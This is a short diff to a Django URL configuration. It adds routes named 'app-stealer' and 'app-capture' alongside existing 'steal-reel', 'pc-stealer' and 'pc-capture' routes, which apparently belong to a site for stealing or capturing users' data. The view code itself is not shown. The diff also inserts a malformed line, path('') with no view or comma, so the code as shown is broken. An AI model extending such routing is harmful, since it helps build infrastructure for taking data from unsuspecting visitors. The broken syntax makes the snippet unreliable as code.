@@ -17,5 +17,8 @@ path('reel/<str:code>/', views.reel_page),
 path('steal-reel/', views.steal_reel),
 path('pc-stealer/', views.pc_stealer_page),
 path('pc-capture/', views.pc_capture),
+path('')
+path('app-stealer/', lambda r: render(r, 'core/app-stealer.html')),
+path('app-capture/', views.app_capture),
     
 ]
